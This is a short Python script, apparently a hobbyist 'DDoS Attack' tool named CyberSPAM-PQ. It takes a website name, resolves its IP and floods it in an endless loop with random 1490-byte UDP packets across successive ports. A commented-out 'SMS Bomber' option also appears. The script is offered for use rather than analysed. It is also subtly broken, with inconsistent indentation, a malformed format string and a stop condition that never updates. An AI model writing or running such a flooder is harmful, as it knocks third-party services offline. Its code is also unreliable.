import sys
import os
import time
import socket
import random

os.system("clear")

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

sent = 0
limit = 0
app = 0
port = 0
stopminute = 0
nowminute = 0

print('##########################################')
print ('Wellcome to CyberSPAM-PQ.softing')
print()
print ('Get SOFT')
print ('[1] - DDoS Attack http://SITE')
#   print ('[2] - SMS Bomber')
print()
print('##########################################')
print()
            # print
            # app = int(input('select a number to launch the app: '))
            # if app == 1:
print
site = input('Имя сайта: ')
ip = socket.gethostbyname(site) 

print ('Site IP: ',ip)
print()
print('##########################################')
print()
print
port = int(input('port: '))
print()
print('TIME: %s:%s'%(hour,minute))
print
limit = int(input('attack limit(minute): '))
stopminute = minute + limit
print('End site attack in: %s:%s'%(hour,stopminute))
print('##########################################')

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     nowminute = now.minute*1
            TIME = datetime.now()
     print ('s%  sent packet #s% to %s on port:%s'%(TIME,sent,ip,port))
     #print (nowminute)
     if port == 65534:
       port = 1

       if nowminute == stopminute:
                        sys.exit()
